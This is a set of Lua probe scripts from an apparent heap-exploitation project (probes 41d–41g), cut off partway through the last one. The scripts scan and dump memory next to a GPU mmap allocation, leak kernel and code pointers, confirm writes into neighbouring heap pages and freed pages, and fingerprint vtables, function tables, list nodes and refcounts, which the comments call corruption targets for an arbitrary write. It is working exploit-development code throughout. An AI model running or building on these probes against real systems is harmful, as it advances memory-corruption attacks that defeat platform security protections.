## probes/phase7_heap_exploitation/41d_heap_dump.lua

```lua
-- CRASH_CLASS: SAFE
-- PROBE 41d: dump non-zero pages before GPU mmap, categorize all qwords
-- Finding from 41c: 256+ readable pages, 90 non-zero, stale heap data

print("=== PROBE 41d: HEAP DATA DUMP ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end

local function hex(n)
    if type(n) == "table" and n.h then
        return string.format("0x%08X%08X", n.h, n.l)
    end
    return string.format("0x%X", tonumber(n) or 0)
end

local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local function dump_qword(val)
    if type(val) == "table" and val.h then
        return string.format("%08X_%08X", val.h, val.l)
    end
    return string.format("%016X", to_num(val))
end

local function get_hi_lo(val)
    if type(val) == "table" and val.h then
        return val.h, val.l
    end
    local n = to_num(val)
    return 0, n
end

local sc_mmap   = make_syscall(477)
local sc_munmap = make_syscall(588)
local PAGE = 0x4000

local function do_mmap(sz)
    local ok, ret = pcall(function()
        return sc_mmap(
            uint64(0), uint64(sz), uint64(0x33),
            uint64(0x1002),
            uint64("0xFFFFFFFFFFFFFFFF"), uint64(0)
        )
    end)
    if not ok then return nil end
    local addr = to_num(ret)
    if addr == 0 or addr >= 0xFFFFFFFF00000000 then return nil end
    return addr
end

--------------------------------------------------------------------
-- Allocate anchor page
--------------------------------------------------------------------
local base = do_mmap(PAGE)
if not base then
    print("mmap FAILED")
    print("=== PROBE 41d COMPLETE ===")
    return
end
print("anchor: " .. hex(base))
print("")

--------------------------------------------------------------------
-- SECTION 1: Scan 512 pages backward, dump ALL non-zero qwords
-- categorize each as: kernel_ptr, heap_ptr, text_ptr, small, ascii, other
--------------------------------------------------------------------
print("--- SECTION 1: FULL BACKWARD SCAN (512 pages x 0x1000) ---")

local stats = {
    kernel_ptr = 0,
    heap_self = 0,
    heap_other = 0,
    user_low = 0,
    small_val = 0,
    ascii_like = 0,
    fill_pattern = 0,
    other = 0,
    total_nonzero = 0,
    pages_readable = 0,
    pages_nonzero = 0,
}

local kernel_ptrs = {}
local interesting = {}

for i = 1, 512 do
    local page_addr = base - i * 0x1000
    if page_addr <= 0 then break end

    local ok_test, test_val = pcall(function() return memory.read_dword(page_addr) end)
    if not ok_test then break end
    stats.pages_readable = stats.pages_readable + 1

    local page_has_data = false

    -- sample 8 qwords per page (every 0x200 bytes) to keep output manageable
    for off = 0, 0xF00, 0x200 do
        local addr = page_addr + off
        local ok_r, qval = pcall(function() return memory.read_qword(addr) end)
        if ok_r then
            local hi, lo = get_hi_lo(qval)
            if hi == 0 and lo == 0 then
                -- skip zero
            else
                stats.total_nonzero = stats.total_nonzero + 1
                page_has_data = true

                -- categorize
                local cat = "other"

                if hi == 0xAFAFAFAF and lo == 0xAFAFAFAF then
                    cat = "fill_pattern"
                elseif hi == 0xDEADDEAD or lo == 0xDEADDEAD then
                    cat = "fill_pattern"
                elseif hi == 0xFEEDFACE or lo == 0xFEEDFACE then
                    cat = "fill_pattern"
                elseif hi >= 0xFFFFFF80 then
                    cat = "kernel_ptr"
                    if #kernel_ptrs < 64 then
                        kernel_ptrs[#kernel_ptrs + 1] = string.format(
                            "  %s +0x%03X: %s", hex(page_addr), off, dump_qword(qval))
                    end
                elseif hi >= 0x00000003 and hi <= 0x00000004 and lo >= 0x10000000 then
                    cat = "heap_self"
                elseif hi == 0x00000000 and lo >= 0x80000000 and lo < 0x90000000 then
                    cat = "user_low"
                elseif hi == 0x00000000 and lo < 0x10000 then
                    cat = "small_val"
                else
                    -- check if looks like ASCII
                    local is_ascii = true
                    local b3 = lo % 256
                    local b2 = math.floor(lo / 256) % 256
                    local b1 = math.floor(lo / 65536) % 256
                    local b0 = math.floor(lo / 16777216) % 256
                    for _, b in ipairs({b0, b1, b2, b3}) do
                        if b ~= 0 and (b < 0x20 or b > 0x7E) then
                            is_ascii = false
                            break
                        end
                    end
                    if is_ascii and lo > 0x20202020 then
                        cat = "ascii_like"
                    end
                end

                stats[cat] = (stats[cat] or 0) + 1

                -- log interesting non-trivial values
                if cat == "kernel_ptr" or cat == "user_low" then
                    -- already logged above for kernel
                    if cat == "user_low" and #interesting < 32 then
                        interesting[#interesting + 1] = string.format(
                            "  %s +0x%03X: %s [%s]", hex(page_addr), off, dump_qword(qval), cat)
                    end
                end
            end
        end
    end

    if page_has_data then
        stats.pages_nonzero = stats.pages_nonzero + 1
    end
end

print("pages readable : " .. stats.pages_readable)
print("pages non-zero : " .. stats.pages_nonzero)
print("sampled qwords : " .. stats.total_nonzero .. " non-zero")
print("")
print("--- CATEGORIES ---")
print("  kernel_ptr   : " .. stats.kernel_ptr)
print("  heap_self    : " .. stats.heap_self)
print("  heap_other   : " .. (stats.other or 0))
print("  user_low     : " .. stats.user_low)
print("  small_val    : " .. stats.small_val)
print("  ascii_like   : " .. stats.ascii_like)
print("  fill_pattern : " .. stats.fill_pattern)
print("")

--------------------------------------------------------------------
-- SECTION 2: Kernel pointer dump
--------------------------------------------------------------------
if #kernel_ptrs > 0 then
    print("--- SECTION 2: KERNEL POINTERS (" .. #kernel_ptrs .. ") ---")
    for _, s in ipairs(kernel_ptrs) do print(s) end
else
    print("--- SECTION 2: NO KERNEL POINTERS FOUND ---")
end
print("")

--------------------------------------------------------------------
-- SECTION 3: Interesting user pointers
--------------------------------------------------------------------
if #interesting > 0 then
    print("--- SECTION 3: USER POINTERS (" .. #interesting .. ") ---")
    for _, s in ipairs(interesting) do print(s) end
else
    print("--- SECTION 3: NO INTERESTING USER PTRS ---")
end
print("")

--------------------------------------------------------------------
-- SECTION 4: Dense dump of first non-zero page (full 64 qwords)
--------------------------------------------------------------------
print("--- SECTION 4: DENSE PAGE DUMP ---")
do
    local found_page = nil
    for i = 1, 512 do
        local addr = base - i * 0x1000
        if addr <= 0 then break end
        local ok_r, val = pcall(function() return memory.read_dword(addr) end)
        if not ok_r then break end
        if to_num(val) ~= 0 then
            found_page = addr
            break
        end
    end

    if found_page then
        print("  page: " .. hex(found_page))
        for off = 0, 0xF8, 8 do
            local ok_r, qval = pcall(function() return memory.read_qword(found_page + off) end)
            if ok_r then
                local hi, lo = get_hi_lo(qval)
                if hi ~= 0 or lo ~= 0 then
                    local tag = ""
                    if hi >= 0xFFFFFF80 then tag = " KPTR!" end
                    if hi >= 3 and hi <= 4 and lo >= 0x10000000 then tag = " HEAP" end
                    print(string.format("  +0x%02X: %s%s", off, dump_qword(qval), tag))
                end
            end
        end
    else
        print("  no non-zero page found")
    end
end

print("")

pcall(function() sc_munmap(uint64(base), uint64(PAGE)) end)
print("=== PROBE 41d COMPLETE ===")
```

## probes/phase7_heap_exploitation/41e_write_test.lua

```lua
-- CRASH_CLASS: SAFE (writes to our own mmap VA range, read-back only)
-- PROBE 41e: test if adjacent heap pages are WRITABLE from our mmap
-- If yes: we have a heap corruption primitive via GPU mmap adjacency

print("=== PROBE 41e: ADJACENT WRITE TEST ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end

local function hex(n)
    if type(n) == "table" and n.h then
        return string.format("0x%08X%08X", n.h, n.l)
    end
    return string.format("0x%X", tonumber(n) or 0)
end

local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local function dump_qword(val)
    if type(val) == "table" and val.h then
        return string.format("%08X_%08X", val.h, val.l)
    end
    return string.format("%016X", to_num(val))
end

local sc_mmap   = make_syscall(477)
local sc_munmap = make_syscall(588)
local PAGE = 0x4000

local function do_mmap(sz)
    local ok, ret = pcall(function()
        return sc_mmap(
            uint64(0), uint64(sz), uint64(0x33),
            uint64(0x1002),
            uint64("0xFFFFFFFFFFFFFFFF"), uint64(0)
        )
    end)
    if not ok then return nil end
    local addr = to_num(ret)
    if addr == 0 or addr >= 0xFFFFFFFF00000000 then return nil end
    return addr
end

--------------------------------------------------------------------
-- Allocate anchor
--------------------------------------------------------------------
local base = do_mmap(PAGE)
if not base then
    print("mmap FAILED")
    print("=== PROBE 41e COMPLETE ===")
    return
end
print("anchor: " .. hex(base))

-- verify our own page is writable
pcall(function() memory.write_dword(base, 0xAAAAAAAA) end)
local ok_v, vv = pcall(function() return memory.read_dword(base) end)
print("own page write: " .. (ok_v and hex(vv) or "FAILED"))
print("")

--------------------------------------------------------------------
-- SECTION 1: Write test at specific offsets before our mmap
-- Try writing a canary, read it back, then RESTORE original value
--------------------------------------------------------------------
print("--- SECTION 1: WRITE TEST (backward, restore after) ---")

local offsets_to_test = {
    -0x1000, -0x2000, -0x3000, -0x4000,
    -0x8000, -0x10000, -0x20000, -0x40000,
    -0x80000,
}

local canary = 0x41424344  -- "ABCD"
local results = {}

for _, off in ipairs(offsets_to_test) do
    local addr = base + off
    if addr <= 0 then break end

    -- 1. read original
    local ok_r, orig = pcall(function() return memory.read_dword(addr) end)
    if not ok_r then
        results[#results + 1] = string.format("  [%+07X] %s READ_FAIL (unmapped)", off, hex(addr))
    else
        local orig_val = to_num(orig)

        -- 2. write canary
        local ok_w = pcall(function() memory.write_dword(addr, canary) end)
        if not ok_w then
            results[#results + 1] = string.format("  [%+07X] %s R=Y W=N (read-only) orig=%s",
                off, hex(addr), hex(orig_val))
        else
            -- 3. read back
            local ok_rb, rb = pcall(function() return memory.read_dword(addr) end)
            local rb_val = ok_rb and to_num(rb) or -1

            if rb_val == canary then
                results[#results + 1] = string.format(
                    "  [%+07X] %s R=Y W=Y CONFIRMED orig=%s",
                    off, hex(addr), hex(orig_val))

                -- 4. restore original
                pcall(function() memory.write_dword(addr, orig_val) end)
            else
                results[#results + 1] = string.format(
                    "  [%+07X] %s R=Y W=? wrote=%s readback=%s",
                    off, hex(addr), hex(canary), hex(rb_val))
            end
        end
    end
end

local write_count = 0
for _, r in ipairs(results) do
    print(r)
    if r:find("W=Y CONFIRMED") then write_count = write_count + 1 end
end
print("")
print("writable pages: " .. write_count .. " / " .. #results)
print("")

--------------------------------------------------------------------
-- SECTION 2: Write to non-zero heap page (prove we can corrupt heap)
-- Find first non-zero page, save 8 bytes, write, verify, restore
--------------------------------------------------------------------
print("--- SECTION 2: HEAP DATA CORRUPTION TEST ---")
do
    local target = nil
    local target_off = nil
    for i = 1, 512 do
        local addr = base - i * 0x1000
        if addr <= 0 then break end
        local ok_r, val = pcall(function() return memory.read_dword(addr) end)
        if ok_r and to_num(val) ~= 0 then
            target = addr
            target_off = -i * 0x1000
            break
        end
    end

    if target then
        print("  target: " .. hex(target) .. " (offset " .. hex(target_off) .. ")")

        -- save original qword
        local ok_ro, orig_q = pcall(function() return memory.read_qword(target) end)
        if ok_ro then
            print("  original: " .. dump_qword(orig_q))

            -- write our pattern
            local ok_w1 = pcall(function() memory.write_dword(target, 0xDEADBEEF) end)
            local ok_w2 = pcall(function() memory.write_dword(target + 4, 0xCAFEF00D) end)

            if ok_w1 and ok_w2 then
                -- read back
                local ok_rb, rb_q = pcall(function() return memory.read_qword(target) end)
                if ok_rb then
                    print("  after write: " .. dump_qword(rb_q))
                    local hi, lo
                    if type(rb_q) == "table" and rb_q.h then
                        hi = rb_q.h
                        lo = rb_q.l
                    else
                        hi = 0
                        lo = to_num(rb_q)
                    end
                    if lo == 0xDEADBEEF and hi == 0xCAFEF00D then
                        print("  *** HEAP WRITE CONFIRMED ***")
                        print("  We can read AND write stale heap data!")
                    elseif lo == 0xDEADBEEF then
                        print("  *** PARTIAL WRITE (lo confirmed) ***")
                    else
                        print("  write did not stick: " .. dump_qword(rb_q))
                    end
                end

                -- restore
                if type(orig_q) == "table" and orig_q.h then
                    pcall(function() memory.write_dword(target, orig_q.l) end)
                    pcall(function() memory.write_dword(target + 4, orig_q.h) end)
                else
                    pcall(function() memory.write_dword(target, to_num(orig_q)) end)
                    pcall(function() memory.write_dword(target + 4, 0) end)
                end
                local ok_rv, rv_q = pcall(function() return memory.read_qword(target) end)
                if ok_rv then
                    print("  restored: " .. dump_qword(rv_q))
                end
            else
                print("  write FAILED: w1=" .. tostring(ok_w1) .. " w2=" .. tostring(ok_w2))
            end
        end
    else
        print("  no non-zero page found")
    end
end
print("")

--------------------------------------------------------------------
-- SECTION 3: Cross-alloc write test
-- Alloc two contiguous pages, write from page1 into page2's VA
--------------------------------------------------------------------
print("--- SECTION 3: CROSS-ALLOC WRITE ---")
do
    local a1 = do_mmap(PAGE)
    local a2 = do_mmap(PAGE)
    if a1 and a2 then
        local lo = math.min(a1, a2)
        local hi = math.max(a1, a2)
        local gap = hi - lo - PAGE
        print("  a1=" .. hex(a1) .. " a2=" .. hex(a2) .. " gap=" .. hex(gap))

        if gap == 0 then
            -- write via a1 into a2's space
            pcall(function() memory.write_dword(lo + PAGE, 0x55667788) end)
            local ok_r, rv = pcall(function() return memory.read_dword(hi) end)
            if ok_r and to_num(rv) == 0x55667788 then
                print("  CROSS-ALLOC WRITE CONFIRMED")
                print("  wrote to a1+PAGE, read from a2: " .. hex(rv))
            else
                print("  cross-alloc read: " .. (ok_r and hex(rv) or "FAIL"))
            end
        else
            print("  not contiguous, testing write to gap")
            local gap_addr = lo + PAGE
            local ok_gr, gv = pcall(function() return memory.read_dword(gap_addr) end)
            if ok_gr then
                local orig = to_num(gv)
                local ok_gw = pcall(function() memory.write_dword(gap_addr, 0x99AABBCC) end)
                local ok_grb, grb = pcall(function() return memory.read_dword(gap_addr) end)
                print("  gap write: " .. (ok_gw and "OK" or "FAIL") ..
                      " readback: " .. (ok_grb and hex(grb) or "FAIL"))
                pcall(function() memory.write_dword(gap_addr, orig) end)
            else
                print("  gap not readable")
            end
        end

        pcall(function() sc_munmap(uint64(a1), uint64(PAGE)) end)
        pcall(function() sc_munmap(uint64(a2), uint64(PAGE)) end)
    end
end
print("")

--------------------------------------------------------------------
-- SECTION 4: Freed-page write test
-- Alloc, free, alloc new anchor, write into freed VA
--------------------------------------------------------------------
print("--- SECTION 4: USE-AFTER-FREE WRITE ---")
do
    local victim = do_mmap(PAGE)
    if victim then
        pcall(function() memory.write_dword(victim, 0x11223344) end)
        print("  victim alloc: " .. hex(victim))

        -- free it
        pcall(function() sc_munmap(uint64(victim), uint64(PAGE)) end)
        print("  victim freed")

        -- alloc new anchor nearby
        local anchor2 = do_mmap(PAGE)
        if anchor2 then
            print("  new anchor: " .. hex(anchor2))
            local dist = (anchor2 > victim) and (anchor2 - victim) or (victim - anchor2)
            print("  distance: " .. hex(dist))

            -- try to read the freed page
            local ok_r, rv = pcall(function() return memory.read_dword(victim) end)
            if ok_r then
                print("  read freed page: " .. hex(rv) .. " READABLE")
                local ok_w = pcall(function() memory.write_dword(victim, 0xAABBCCDD) end)
                if ok_w then
                    local ok_rb, rb = pcall(function() return memory.read_dword(victim) end)
                    if ok_rb and to_num(rb) == 0xAABBCCDD then
                        print("  *** USE-AFTER-FREE WRITE CONFIRMED ***")
                    else
                        print("  write readback: " .. (ok_rb and hex(rb) or "FAIL"))
                    end
                else
                    print("  write to freed page FAILED")
                end
            else
                print("  freed page not readable (properly unmapped)")
            end

            pcall(function() sc_munmap(uint64(anchor2), uint64(PAGE)) end)
        end
    end
end

print("")
print("=== PROBE 41e COMPLETE ===")
```

## probes/phase7_heap_exploitation/41f_heap_objects.lua

```lua
-- CRASH_CLASS: SAFE (read-only scan of adjacent heap)
-- PROBE 41f: fingerprint heap objects for vtables / function pointers
-- We have full R/W on adjacent heap. Now find corruption targets:
--   - vtable pointers (ptr to array of ptrs in text/rodata)
--   - function pointers (direct ptr into executable .text)
--   - refcounts adjacent to pointers (corrupt refcount -> UAF)
--   - linked list nodes (corrupt next/prev -> arbitrary write)

print("=== PROBE 41f: HEAP OBJECT FINGERPRINTING ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end

local function hex(n)
    if type(n) == "table" and n.h then
        return string.format("0x%08X%08X", n.h, n.l)
    end
    return string.format("0x%X", tonumber(n) or 0)
end

local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local function get_hi_lo(val)
    if type(val) == "table" and val.h then
        return val.h, val.l
    end
    return 0, to_num(val)
end

local function dump_qword(val)
    if type(val) == "table" and val.h then
        return string.format("%08X_%08X", val.h, val.l)
    end
    return string.format("%016X", to_num(val))
end

local sc_mmap   = make_syscall(477)
local sc_munmap = make_syscall(588)
local PAGE = 0x4000

local function do_mmap(sz)
    local ok, ret = pcall(function()
        return sc_mmap(uint64(0), uint64(sz), uint64(0x33),
            uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
    end)
    if not ok then return nil end
    local addr = to_num(ret)
    if addr == 0 or addr >= 0xFFFFFFFF00000000 then return nil end
    return addr
end

local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end

local base = do_mmap(PAGE)
if not base then
    print("mmap FAILED")
    return
end
print("anchor: " .. hex(base))
print("")

--------------------------------------------------------------------
-- Classify a 64-bit value
--------------------------------------------------------------------
local function classify(hi, lo)
    if hi == 0 and lo == 0 then return "zero" end
    if hi == 0xAFAFAFAF and lo == 0xAFAFAFAF then return "freed" end
    if hi == 0xDEADDEAD then return "freed" end

    -- kernel range
    if hi >= 0xFFFFFF80 then return "kptr" end

    -- executable text (modules at 0x80xxxxxxx from probe 39b)
    if hi == 0 and lo >= 0x80000000 and lo < 0x90000000 then return "text_ptr" end

    -- our heap area 0x3_1xxxxxxx
    if hi >= 0x00000003 and hi <= 0x00000003 and lo >= 0x10000000 then return "heap_ptr" end

    -- other heap 0x2_xxxxxxxx or 0x3_0xxxxxxx
    if hi >= 0x00000002 and hi <= 0x00000003 then return "heap_other" end

    -- small (refcount, size, flags)
    if hi == 0 and lo < 0x10000 then return "small" end

    -- negative small (error codes)
    if hi == 0xFFFFFFFF and lo >= 0xFFFF0000 then return "neg_small" end

    return "other"
end

--------------------------------------------------------------------
-- SECTION 1: Full object scan — read every qword in 512 pages
-- Look for patterns: [ptr][ptr][small] = vtable+data object
--------------------------------------------------------------------
print("--- SECTION 1: OBJECT PATTERN SCAN ---")

local vtable_candidates = {}
local fptr_candidates = {}
local linked_list = {}
local refcount_ptrs = {}
local text_ptrs = {}

local scan_pages = 0
local total_qwords = 0

for i = 1, 512 do
    local page_base = base - i * 0x1000
    if page_base <= 0 then break end

    local test = safe_rd(page_base)
    if test == nil then break end
    scan_pages = scan_pages + 1

    -- read page in 8-byte strides, look for patterns
    -- but limit to every 0x10 to keep runtime reasonable (8 qwords per 0x80)
    for off = 0, 0xFE0, 0x10 do
        local addr = page_base + off
        local q0 = safe_rq(addr)
        local q1 = safe_rq(addr + 8)
        if q0 and q1 then
            local h0, l0 = get_hi_lo(q0)
            local h1, l1 = get_hi_lo(q1)
            local c0 = classify(h0, l0)
            local c1 = classify(h1, l1)
            total_qwords = total_qwords + 2

            -- Pattern: text_ptr followed by anything = possible function pointer
            if c0 == "text_ptr" then
                if #text_ptrs < 48 then
                    text_ptrs[#text_ptrs + 1] = {
                        addr = addr, val = dump_qword(q0),
                        next_class = c1, next_val = dump_qword(q1)
                    }
                end
            end

            -- Pattern: heap_ptr, heap_ptr = linked list node or vtable
            if c0 == "heap_ptr" and c1 == "heap_ptr" then
                if #linked_list < 32 then
                    linked_list[#linked_list + 1] = {
                        addr = addr, v0 = dump_qword(q0), v1 = dump_qword(q1)
                    }
                end
            end

            -- Pattern: small (1-4) followed by heap_ptr = refcount + ptr
            if c0 == "small" and l0 >= 1 and l0 <= 16 and c1 == "heap_ptr" then
                if #refcount_ptrs < 32 then
                    refcount_ptrs[#refcount_ptrs + 1] = {
                        addr = addr, refcount = l0, ptr = dump_qword(q1)
                    }
                end
            end

            -- Pattern: heap_ptr followed by text_ptr = vtable candidate
            if c0 == "heap_ptr" and c1 == "text_ptr" then
                if #vtable_candidates < 32 then
                    vtable_candidates[#vtable_candidates + 1] = {
                        addr = addr, heap = dump_qword(q0), text = dump_qword(q1)
                    }
                end
            end

            -- Pattern: text_ptr followed by text_ptr = function table
            if c0 == "text_ptr" and c1 == "text_ptr" then
                if #fptr_candidates < 32 then
                    fptr_candidates[#fptr_candidates + 1] = {
                        addr = addr, f0 = dump_qword(q0), f1 = dump_qword(q1)
                    }
                end
            end
        end
    end
end

print("scanned: " .. scan_pages .. " pages, " .. total_qwords .. " qwords")
print("")

--------------------------------------------------------------------
-- SECTION 2: Text pointers (executable code addresses)
--------------------------------------------------------------------
print("--- SECTION 2: TEXT POINTERS (" .. #text_ptrs .. ") ---")
for j, t in ipairs(text_ptrs) do
    if j > 24 then
        print("  ... " .. (#text_ptrs - 24) .. " more")
        break
    end
    print(string.format("  %s: %s [next: %s %s]",
        hex(t.addr), t.val, t.next_class, t.next_val))
end
print("")

--------------------------------------------------------------------
-- SECTION 3: Function pointer tables (text+text)
--------------------------------------------------------------------
print("--- SECTION 3: FUNCTION TABLES (" .. #fptr_candidates .. ") ---")
for j, f in ipairs(fptr_candidates) do
    if j > 16 then
        print("  ... " .. (#fptr_candidates - 16) .. " more")
        break
    end
    -- read more to see if it's a longer table
    local depth = 2
    for k = 1, 6 do
        local qn = safe_rq(f.addr + 8 + k * 8)
        if qn then
            local hn, ln = get_hi_lo(qn)
            if classify(hn, ln) == "text_ptr" then
                depth = depth + 1
            else
                break
            end
        end
    end
    print(string.format("  %s: %s %s (depth=%d)",
        hex(f.addr), f.f0, f.f1, depth))
end
print("")

--------------------------------------------------------------------
-- SECTION 4: Vtable candidates (heap_ptr + text_ptr)
--------------------------------------------------------------------
print("--- SECTION 4: VTABLE CANDIDATES (" .. #vtable_candidates .. ") ---")
for j, v in ipairs(vtable_candidates) do
    if j > 16 then
        print("  ... " .. (#vtable_candidates - 16) .. " more")
        break
    end
    print(string.format("  %s: heap=%s text=%s", hex(v.addr), v.heap, v.text))
end
print("")

--------------------------------------------------------------------
-- SECTION 5: Linked list nodes (heap_ptr + heap_ptr)
--------------------------------------------------------------------
print("--- SECTION 5: LINKED LISTS (" .. #linked_list .. ") ---")
for j, l in ipairs(linked_list) do
    if j > 16 then
        print("  ... " .. (#linked_list - 16) .. " more")
        break
    end
    print(string.format("  %s: %s -> %s", hex(l.addr), l.v0, l.v1))
end
print("")

--------------------------------------------------------------------
-- SECTION 6: Refcount + pointer pairs
--------------------------------------------------------------------
print("--- SECTION 6: REFCOUNT+PTR (" .. #refcount_ptrs .. ") ---")
for j, r in ipairs(refcount_ptrs) do
    if j > 16 then
        print("  ... " .. (#refcount_ptrs - 16) .. " more")
        break
    end
    print(string.format("  %s: rc=%d ptr=%s", hex(r.addr), r.refcount, r.ptr))
end
print("")

--------------------------------------------------------------------
-- SECTION 7: Dereference text pointers — are they in .text?
-- Read bytes at the pointer target to see if they look like code
--------------------------------------------------------------------
print("--- SECTION 7: TEXT PTR DEREFERENCE ---")
do
    local tested = 0
    for _, t in ipairs(text_ptrs) do
        if tested >= 8 then break end
        -- extract the address from the qword
        local q = safe_rq(t.addr)
        if q then
            local hi, lo = get_hi_lo(q)
            -- text ptrs are in 0x8xxxxxxx range (32-bit)
            if hi == 0 and lo >= 0x80000000 and lo < 0x90000000 then
                local ok_r, byte0 = pcall(function() return memory.read_dword(lo) end)
                if ok_r then
                    local bv = to_num(byte0)
                    -- check if it could be x86 code (common prefixes)
                    local b0 = bv % 256
                    local looks_like_code = (
                        b0 == 0x55 or  -- push rbp
                        b0 == 0x48 or  -- REX.W prefix
                        b0 == 0x41 or  -- REX.B
                        b0 == 0x89 or  -- mov
                        b0 == 0xE8 or  -- call
                        b0 == 0xE9 or  -- jmp
                        b0 == 0xCC or  -- int3
                        b0 == 0xC3 or  -- ret
                        b0 == 0x53 or  -- push rbx
                        b0 == 0x57     -- push rdi
                    )
                    local tag = looks_like_code and "CODE" or "DATA"
                    print(string.format("  *%s -> %s [%s] b0=%02X",
                        hex(lo), hex(bv), tag, b0))
                    tested = tested + 1
                else
                    print(string.format("  *%s -> FAULT (not mapped)", hex(lo)))
                    tested = tested + 1
                end
            end
        end
    end
    if tested == 0 then
        print("  no text pointers to dereference")
    end
end

print("")
pcall(function() sc_munmap(uint64(base), uint64(PAGE)) end)
print("=== PROBE 41f COMPLETE ===")
```

## probes/phase7_heap_exploitation/41g_heap_objects_lite.lua

```lua
-- CRASH_CLASS: SAFE
-- PROBE 41g: lighter heap object scan (41f crashed from too many reads)
-- Strategy: only scan non-zero pages, sample 4 qwords per page

print("=== PROBE 41g: HEAP OBJECT SCAN (LITE) ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end

local function hex(n)
    if type(n) == "table" and n.h then
        return string.format("0x%08X%08X", n.h, n.l)
    end
    return string.format("0x%X", tonumber(n) or 0)
end

local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local function get_hi_lo(val)
    if type(val) == "table" and val.h then
        return val.h, val.l
    end
    return 0, to_num(val)
end

local function dump_qword(val)
    if type(val) == "table" and val.h then
        return string.format("%08X_%08X", val.h, val.l)
    end
    return string.format("%016X", to_num(val))
end

local sc_mmap   = make_syscall(477)
local sc_munmap = make_syscall(588)
local PAGE = 0x4000

local function do_mmap(sz)
    local ok, ret = pcall(function()
        return sc_mmap(uint64(0), uint64(sz), uint64(0x33),
            uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
    end)
    if not ok then return nil end
    local addr = to_num(ret)
    if addr == 0 or addr >= 0xFFFFFFFF00000000 then return nil end
    return addr
end

local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end

local base = do_mmap(PAGE)
if not base then
    print("mmap FAILED")
    return
end
print("anchor: " .. hex(base))
print("")

--------------------------------------------------------------------
-- Pass 1: find non-zero pages (one read per page)
--------------------------------------------------------------------
print("--- PASS 1: FIND NON-ZERO PAGES ---")
local nz_pages = {}
for i = 1, 256 do
    local addr = base - i * 0x1000
    if addr <= 0 then break end
    local v = safe_rd(addr)
    if v == nil then break end
    if v ~= 0 then
        nz_pages[#nz_pages + 1] = addr
    end
end
print("non-zero pages: " .. #nz_pages)
print("")

--------------------------------------------------------------------
-- Pass 2: scan each non-zero page — read 16 qword pairs (every 0x100)
--------------------------------------------------------------------
print("--- PASS 2: OBJECT PATTERNS ---")

local text_ptrs = {}
local fptr_tables = {}
local vtable_cands = {}
local list_nodes = {}
local rc_ptrs = {}
local kptrs = {}

for _, pg in ipairs(nz_pages) do
    for off = 0, 0xF00, 0x100 do
        local a = pg + off
        local q0 = safe_rq(a)
        local q1 = safe_rq(a + 8)
        if q0 and q1 then
            local h0, l0 = get_hi_lo(q0)
            local h1, l1 = get_hi_lo(q1)

            -- kernel ptr
            if h0 >= 0xFFFFFF80 and #kptrs < 32 then
                kptrs[#kptrs + 1] = string.format("%s +%03X: %s", hex(pg), off, dump_qword(q0))
            end
            if h1 >= 0xFFFFFF80 and #kptrs < 32 then
                kptrs[#kptrs + 1] = string.format("%s +%03X: %s", hex(pg), off + 8, dump_qword(q1))
            end

            -- text ptr (0x8xxxxxxx)
            local c0_text = (h0 == 0 and l0 >= 0x80000000 and l0 < 0x90000000)
            local c1_text = (h1 == 0 and l1 >= 0x80000000 and l1 < 0x90000000)

            -- heap ptr (0x3_1xxxxxxx)
            local c0_heap = (h0 == 3 and l0 >= 0x10000000)
            local c1_heap = (h1 == 3 and l1 >= 0x10000000)

            -- small value
            local c0_small = (h0 == 0 and l0 >= 1 and l0 <= 16)

            if c0_text and #text_ptrs < 48 then
                text_ptrs[#text_ptrs + 1] = string.format("%s +%03X: %s", hex(pg), off, dump_qword(q0))
            end

            if c0_text and c1_text and #fptr_tables < 24 then
                fptr_tables[#fptr_tables + 1] = string.format("%s +%03X: %s %s", hex(pg), off, dump_qword(q0), dump_qword(q1))
            end

            if c0_heap and c1_text and #vtable_cands < 24 then
                vtable_cands[#vtable_cands + 1] = string.format("%s +%03X: heap=%s text=%s", hex(pg), off, dump_qword(q0), dump_qword(q1))
            end

            if c0_heap and c1_heap and #list_nodes < 24 then
                list_nodes[#list_nodes + 1] = string.format("%s +%03X: %s -> %s", hex(pg), off, dump_qword(q0), dump_qword(q1))
            end

            if c0_small and c1_heap and #rc_ptrs < 24 then
                rc_ptrs[#rc_ptrs + 1] = string.format("%s +%03X: rc=%d ptr=%s", hex(pg), off, l0, dump_qword(q1))
            end
        end
    end
end

print("")
print("--- KERNEL POINTERS: " .. #kptrs .. " ---")
for _, s in ipairs(kptrs) do print("  " .. s) end

print("")
print("--- TEXT POINTERS: " .. #text_ptrs .. " ---")
for j, s in ipairs(text_ptrs) do
    if j > 24 then print("  ..." .. (#text_ptrs - 24) .. " more"); break end
    print("  " .. s)
end

print("")
print("--- FUNCTION TABLES (text+text): " .. #fptr_tables .. " ---")
for j, s in ipairs(fptr_tables) do
    if j > 16 then print("  ..." .. (#fptr_tables - 16) .. " more"); break end
    print("  " .. s)
end

print("")
print("--- VTABLE CANDS (heap+text): " .. #vtable_cands .. " ---")
for j, s in ipairs(vtable_cands) do
    if j > 16 then print("  ..." .. (#vtable_cands - 16) .. " more"); break end
